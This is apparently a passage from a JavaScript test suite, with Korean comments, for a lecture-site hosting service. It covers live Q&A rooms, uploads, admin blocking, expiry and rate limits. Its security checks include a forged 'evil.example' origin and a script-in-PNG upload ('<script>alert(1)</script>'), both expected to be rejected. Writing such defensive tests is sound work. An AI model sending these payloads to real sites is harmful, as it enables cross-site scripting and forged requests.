    const s = await newSite(base, '실시간 사이트');
    const liveFiles = await buildSite('sel-story', { patch: (bp) => { bp.live = { ...bp.live, provider: 'http', url: `${base}/live`, code: CODE }; } });
    assert.equal((await deploy(base, s, liveFiles)).status, 200);
    assert.ok((await text(s.url)).text.includes(`${base}/live`), '사이트가 이 호스트의 방을 가리킴');

    // 묶기 전: 방이 없음(아무나 만들 수 없음)
    assert.equal((await lv('GET', '/snapshot')).status, 404);
    const early = await lv('POST', '/join', { json: { nickname: '봄' } });
    assert.equal(early.status, 404); assert.equal(early.body.error, 'unknown_training');
    assert.equal((await lv('POST', '/init', { json: { adminKeyHash: hash } })).status, 404, '방 등록 주소는 밖에 열려 있지 않음');
    assert.equal((await lv('PUT', '/state', { json: { slide: 1 }, admin: ADMIN })).status, 404);

    // 묶기: 사이트 수정 열쇠로만
    const bindPath = `/api/sites/${s.id}/live`;
    assert.equal((await call(base, 'POST', bindPath, { json: { code: CODE, adminKeyHash: hash } })).status, 401);
    assert.equal((await call(base, 'POST', bindPath, { key: 'x'.repeat(43), json: { code: CODE, adminKeyHash: hash } })).status, 401);
    assert.equal(code(await call(base, 'POST', bindPath, { key: s.key, json: { code: 'a b', adminKeyHash: hash } })), 'bad_request');
    assert.equal(code(await call(base, 'POST', bindPath, { key: s.key, json: { code: CODE, adminKeyHash: 'abc' } })), 'bad_request');
    assert.equal(code(await call(base, 'POST', bindPath, { key: s.key, json: { code: CODE, adminKeyHash: sha256('change-me') } })), 'bad_request', '예시 키');
    assert.equal((await lv('GET', '/snapshot')).status, 404, '실패한 묶기는 방을 만들지 않음');
    const b = await call(base, 'POST', bindPath, { key: s.key, json: { code: CODE.toLowerCase(), adminKeyHash: hash, settings: { retentionDays: 365, uploads: true, moderation: false } } });
    assert.equal(b.status, 200, JSON.stringify(b.body));
    assert.deepEqual(b.body, { url: `${base}/live`, code: CODE });
    assert.equal((await call(base, 'POST', bindPath, { key: s.key, json: { code: CODE, adminKeyHash: hash } })).status, 200, '다시 불러도 됨');
    // 다른 사이트는 같은 코드를 못 씀
    const other = await newSite(base, '다른 사이트');
    const taken = await call(base, 'POST', `/api/sites/${other.id}/live`, { key: other.key, json: { code: CODE, adminKeyHash: sha256('another-teacher-key-01') } });
    assert.equal(taken.status, 409); assert.equal(code(taken), 'code_taken');

    // 실시간 연결(WebSocket)
    const events = [];
    const ws = new WebSocket(`${live.replace(/^http/, 'ws')}/ws`);
    await new Promise((res, rej) => { ws.onmessage = (e) => { const m = JSON.parse(e.data); events.push(m); if (m.type === 'hello') res(); }; ws.onerror = () => rej(new Error('WebSocket 연결 실패')); setTimeout(() => rej(new Error('WebSocket hello 시간 초과')), 8000); });
    assert.equal(events[0].mode, 'ws');

    // 참여 → 질문
    const j = await lv('POST', '/join', { json: { nickname: '봄날' }, headers: { origin: base } });
    assert.equal(j.status, 201, JSON.stringify(j.body)); assert.ok(j.body.token);
    const q = await lv('POST', '/questions', { json: { text: '쉬는 시간은 언제인가요?' }, token: j.body.token, headers: { origin: base } });
    assert.equal(q.status, 201, JSON.stringify(q.body));
    await new Promise((res, rej) => { const t0 = Date.now(); const tick = () => (events.some((m) => m.type === 'add' && m.col === 'questions' && m.doc?.text === '쉬는 시간은 언제인가요?') ? res() : Date.now() - t0 > 5000 ? rej(new Error('질문이 실시간으로 오지 않음')) : setTimeout(tick, 50)); tick(); });
    ws.close();
    // 다른 출처의 화면은 쓰지 못함
    const cross = await lv('POST', '/questions', { json: { text: 'x' }, token: j.body.token, headers: { origin: 'https://evil.example' } });
    assert.equal(cross.status, 403); assert.equal(cross.body.error, 'origin_not_allowed');
    // 강사(관리자 키)가 봄. 운영자 열쇠·틀린 키로는 참가자 명단을 못 봄
    const adm = await lv('GET', '/snapshot', { admin: TEACHER });
    assert.equal(adm.status, 200);
    assert.equal(adm.body.questions.length, 1); assert.equal(adm.body.questions[0].text, '쉬는 시간은 언제인가요?');
    assert.equal(adm.body.participants.length, 1); assert.equal(adm.body.participants[0].nickname, '봄날');
    for (const k of [ADMIN, 'wrong-key-000000', s.key]) { const r = await lv('GET', '/snapshot', { admin: k }); assert.ok(!r.body.participants || r.body.participants.length === 0, '관리자 키가 아니면 명단 없음'); }
    assert.equal((await lv('PUT', '/state', { json: { slide: 2 }, admin: ADMIN })).status, 403);
    assert.equal((await lv('PUT', '/state', { json: { slide: 2 }, admin: TEACHER })).status, 200);

    // 보드에 그림 올리기(R2 없이) → 글에 붙이기 → 받기
    const form = new FormData(); form.append('file', new Blob([PNG], { type: 'image/png' }), '우리 반.png');
    const up = await lv('POST', '/upload', { token: j.body.token, body: form, headers: { origin: base } });
    assert.equal(up.status, 201, JSON.stringify(up.body));
    assert.match(up.body.url, new RegExp(`^/api/${CODE}/files/[a-f0-9]{24}\\.png$`));
    assert.equal((await fetch(base + up.body.url)).status, 404, '글에 붙기 전에는 안 보임');
    const post = await lv('POST', '/posts', { json: { text: '오늘 활동 사진', files: [{ url: base + up.body.url, name: up.body.name, type: up.body.type, size: up.body.size }] }, token: j.body.token });
    assert.equal(post.status, 201, JSON.stringify(post.body));
    const snap = await lv('GET', '/snapshot');
    assert.equal(snap.body.posts[0].files[0].url, base + up.body.url, '화면이 여는 주소(출처 맨 위 기준)');
    const img = await bin(base + up.body.url);
    assert.equal(img.status, 200); assert.deepEqual(img.bytes, PNG);
    assert.equal(img.headers.get('content-type'), 'image/png'); assert.equal(img.headers.get('x-content-type-options'), 'nosniff');
    assert.ok(img.headers.get('content-security-policy').includes('sandbox'));
    assert.equal((await bin(`${base}/live${up.body.url}`)).status, 200, '/live 아래 주소로도 열림');
    const html = new FormData(); html.append('file', new Blob(['<!doctype html><script>alert(1)</script>'], { type: 'image/png' }), 'x.png');
    assert.equal((await lv('POST', '/upload', { token: j.body.token, body: html })).status, 415, '형식은 내용으로 가림');
    // 전체 저장량에 방도 들어감
    const listed = (await call(base, 'GET', '/api/admin/sites', { key: ADMIN })).body.sites.find((x) => x.id === s.id);
    assert.equal(listed.liveCode, CODE); assert.ok(listed.roomBytes > 0, `roomBytes ${listed.roomBytes}`);

    // 사이트를 가리면 방도 가려짐
    assert.equal((await call(base, 'POST', `/api/admin/sites/${s.id}/block`, { key: ADMIN, json: { blocked: true } })).body.liveCode, CODE);
    const blocked = await lv('GET', '/snapshot');
    assert.equal(blocked.status, 403); assert.equal(blocked.body.error, 'blocked');
    assert.equal((await fetch(base + up.body.url)).status, 403);
    assert.equal(code(await call(base, 'POST', bindPath, { key: s.key, json: { code: CODE, adminKeyHash: hash } })), 'blocked');
    await call(base, 'POST', `/api/admin/sites/${s.id}/block`, { key: ADMIN, json: { blocked: false } });
    assert.equal((await lv('GET', '/snapshot')).status, 200);

    // 다시 공개하면 방의 기간도 늘어남(오류 없이)
    assert.equal((await deploy(base, s, liveFiles)).status, 200);
    assert.equal((await lv('GET', '/snapshot')).body.questions.length, 1);

    // 사이트를 지우면 방·파일도 사라짐
    assert.equal((await call(base, 'DELETE', `/api/sites/${s.id}`, { key: s.key })).status, 204);
    const gone = await lv('GET', '/snapshot', { admin: TEACHER });
    assert.equal(gone.status, 404); assert.equal(gone.body.error, 'unknown_training');
    assert.equal((await fetch(base + up.body.url)).status, 404);
    assert.equal((await lv('POST', '/join', { json: { nickname: '봄' } })).status, 404);
    // 비워진 코드는 다른 사이트가 쓸 수 있고, 예전 기록은 없음
    const reuse = await call(base, 'POST', `/api/sites/${other.id}/live`, { key: other.key, json: { code: CODE, adminKeyHash: sha256('another-teacher-key-01') } });
    assert.equal(reuse.status, 200, JSON.stringify(reuse.body));
    const fresh = await lv('GET', '/snapshot', { admin: 'another-teacher-key-01' });
    assert.equal(fresh.status, 200); assert.equal(fresh.body.questions.length, 0); assert.equal(fresh.body.participants.length, 0);
    // 코드를 바꿔 묶으면 예전 방은 비움
    const CODE2 = CODE + 'B';
    assert.equal((await call(base, 'POST', `/api/sites/${other.id}/live`, { key: other.key, json: { code: CODE2, adminKeyHash: sha256('another-teacher-key-01') } })).status, 200);
    assert.equal((await lv('GET', '/snapshot')).status, 404);
    assert.equal((await fetch(`${base}/live/api/${CODE2}/snapshot`)).status, 200);
  });

  await t.test('서버가 끝까지 멀쩡함', async () => {
    assert.equal((await call(base, 'GET', '/api/info')).status, 200);
    assert.ok(!/Uncaught|Error: /.test(h.log().split('\n').filter((l) => !/live error|\[wrangler:/.test(l)).join('\n')), h.log().slice(-2000));
  });
});

test('횟수 제한·공개 기간 끝(짧게 줄여서)·관리자 열쇠가 없을 때', async (t) => {
  // 공개 기간 12초, 같은 IP에서 한 시간에 사이트 2개
  const h = await host({ SITES_PER_HOUR: 2, SITE_DAYS: 12 / 86400, KEEP_ALIVE: 'off' }); // 방문으로 기간이 늘지 않게 끄고 봄(늘어나는 것은 아래에서 따로)
  if (!h) return t.skip(skip);
  const base = h.url;
  const CODE = 'EXP' + randomBytes(3).toString('hex').toUpperCase();
  const files = await buildSite('data-lab');
  const s = await newSite(base);
  assert.ok(s.expiresAt - Date.now() < 15000);
  assert.equal((await call(base, 'POST', `/api/sites/${s.id}/live`, { key: s.key, json: { code: CODE, adminKeyHash: sha256('expiry-teacher-key-01') } })).status, 200);
  const r = await deploy(base, s, files);
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal((await text(s.url)).status, 200);
  const j = await call(base, 'POST', `/live/api/${CODE}/join`, { json: { nickname: '봄' } });
  assert.equal(j.status, 201);

  await t.test('관리자 열쇠(ADMIN_KEY)를 넣지 않으면 관리 주소는 없음', async () => {
    for (const [m, p] of [['GET', '/api/admin/reports'], ['GET', '/api/admin/sites'], ['POST', `/api/admin/sites/${s.id}/block`], ['DELETE', `/api/admin/sites/${s.id}`]]) {
      const x = await call(base, m, p, { key: 'anything', json: m === 'POST' ? { blocked: true } : undefined });
      assert.equal(x.status, 404, `${m} ${p}`);
    }
    assert.equal((await text(s.url)).status, 200);
  });

  await t.test('같은 인터넷 주소에서 새 사이트는 한 시간에 정한 수까지', async () => {
    assert.equal((await call(base, 'POST', '/api/sites', { json: {} })).status, 201);
    const third = await call(base, 'POST', '/api/sites', { json: {} });
    assert.equal(third.status, 429); assert.equal(code(third), 'rate_limited');
    assert.ok(Number(third.headers.get('retry-after')) > 0);
    assert.ok(/[가-힣]/.test(third.body.error.message_ko));
  });

  await t.test('공개 기간이 끝나면 사이트·파일·방이 지워짐', async () => {
    const until = Date.now() + 45000; let page;
    for (;;) {
      page = await text(s.url);
      if (page.status === 404 || Date.now() > until) break;
      await new Promise((res) => setTimeout(res, 1000));
    }
    assert.equal(page.status, 404, '기간이 끝났는데 열림');
    assert.ok(page.text.includes('이 사이트는 공개 기간이 끝났어요'));
    assert.equal((await text(`${s.url}assets/lecpage.js`)).status, 404);
    const d = await call(base, 'POST', `/api/sites/${s.id}/deploys`, { key: s.key, json: { files: manifestOf(files) } });
    assert.equal(d.status, 404); assert.equal(code(d), 'not_found');
    assert.equal((await call(base, 'POST', `/api/sites/${s.id}/live`, { key: s.key, json: { code: CODE, adminKeyHash: sha256('expiry-teacher-key-01') } })).status, 404);
    // 방도 닫힘(사이트의 알람이 방을 비우거나, 방이 사이트에 물어보고 스스로 비움)
    const snap = await call(base, 'GET', `/live/api/${CODE}/snapshot`);
    assert.equal(snap.status, 404); assert.equal(snap.body.error, 'unknown_training');
    assert.equal((await call(base, 'POST', `/live/api/${CODE}/questions`, { json: { text: 'x' }, headers: { 'x-lec-token': j.body.token } })).status, 404);
  });
});

test('실시간을 끈 서버(LIVE=off)', async (t) => {
  const h = await host({ LIVE: 'off' });
  if (!h) return t.skip(skip);
  const base = h.url;
  const info = await call(base, 'GET', '/api/info');
  assert.equal(info.status, 200); assert.equal(info.body.live, undefined);
  for (const p of ['/live/api/health', '/live/api/AB12CD/snapshot', '/api/AB12CD/files/0123456789abcdef01234567.png']) assert.equal((await call(base, 'GET', p)).status, 404, p);
  const s = await newSite(base);
  const r = await call(base, 'POST', `/api/sites/${s.id}/live`, { key: s.key, json: { code: 'AB12CD', adminKeyHash: sha256('some-teacher-key-01') } });
  assert.equal(r.status, 404); assert.equal(code(r), 'not_found');
  assert.equal((await deploy(base, s, await buildSite('data-lab'))).status, 200, '사이트 올리기는 그대로');
});

test('하루 요청 예산(무료 요금제): 많이 쓰면 새 사이트·새 방만 멈추고 올라온 사이트는 계속 열림', async (t) => {
  const h = await host({ DAILY_REQUEST_BUDGET: 200 });
  if (!h) return t.skip(skip);
  const base = h.url;
  const first = await call(base, 'GET', '/api/info');
  assert.deepEqual([first.body.plan, first.body.accepting], ['free', true]);
  const s = await newSite(base);
  assert.equal((await deploy(base, s, await buildSite('data-lab'))).status, 200);
  // 예산의 60%(120건)를 넘김. 묶어서 세므로(50건마다) 넉넉히 보냄
  for (let i = 0; i < 6; i++) await Promise.all(Array.from({ length: 30 }, () => fetch(`${base}/s/${s.id}/`).then((r) => r.arrayBuffer())));
  let info;
  for (let i = 0; i < 20; i++) { info = await call(base, 'GET', '/api/info'); if (info.body.accepting === false) break; await new Promise((r) => setTimeout(r, 250)); }
  assert.equal(info.body.accepting, false, '예산을 많이 쓰면 받지 않는다고 알림');
  const more = await call(base, 'POST', '/api/sites', { json: { title: 'x' } });
  assert.equal(more.status, 429); assert.equal(code(more), 'rate_limited'); assert.ok(Number(more.headers.get('retry-after')) > 0);
  assert.match(more.body.error.message_ko, /이미 올린 사이트는 그대로/);
  assert.equal((await fetch(`${base}/s/${s.id}/`)).status, 200, '올라온 사이트는 그대로 열림');
  assert.equal((await deploy(base, s, await buildSite('data-lab'))).status, 200, '이미 있는 사이트는 다시 올릴 수 있음');
  const room = await call(base, 'POST', `/api/sites/${s.id}/live`, { key: s.key, json: { code: 'QK7MZA', adminKeyHash: sha256('budget-teacher-key-01') } });
  assert.equal(room.status, 429, '새 방도 받지 않음');
});

test('유료 요금제(PLAN=paid): 예산으로 막지 않음', async (t) => {
  const h = await host({ PLAN: 'paid' });
  if (!h) return t.skip(skip);
  const base = h.url;
  const info = await call(base, 'GET', '/api/info');
  assert.deepEqual([info.body.plan, info.body.accepting], ['paid', true]);
  for (let i = 0; i < 3; i++) await Promise.all(Array.from({ length: 40 }, () => fetch(`${base}/s/nope/`).then((r) => r.arrayBuffer())));
  assert.equal((await call(base, 'POST', '/api/sites', { json: { title: 'x' } })).status, 201);
});

test('방문이 이어지는 사이트는 공개 기간이 늘어남(짧게 줄여서)', async (t) => {
  // 공개 기간 16초. 남은 기간이 절반(8초) 아래일 때 화면을 열면 다시 16초
  const h = await host({ SITE_DAYS: 16 / 86400 });
  if (!h) return t.skip(skip);
  const base = h.url;
  const s = await newSite(base);
  const d = await deploy(base, s, await buildSite('data-lab'));
  assert.equal(d.status, 200);
  const exp0 = d.body.expiresAt;
  assert.equal((await fetch(`${base}/s/${s.id}/`)).status, 200); // 아직 절반 이상 남음 → 그대로
  await new Promise((r) => setTimeout(r, 10000));
  assert.equal((await fetch(`${base}/s/${s.id}/`)).status, 200, '방문 → 기간이 다시 참');
  await new Promise((r) => setTimeout(r, 9000)); // 처음 기간(16초)은 지남
  assert.ok(Date.now() > exp0, '처음 정한 기간은 지났음');
  assert.equal((await fetch(`${base}/s/${s.id}/`)).status, 200, '방문이 있었으니 아직 열려 있음');
  const again = await deploy(base, s, await buildSite('data-lab'));
  assert.equal(again.status, 200); assert.ok(again.body.expiresAt > exp0);
});
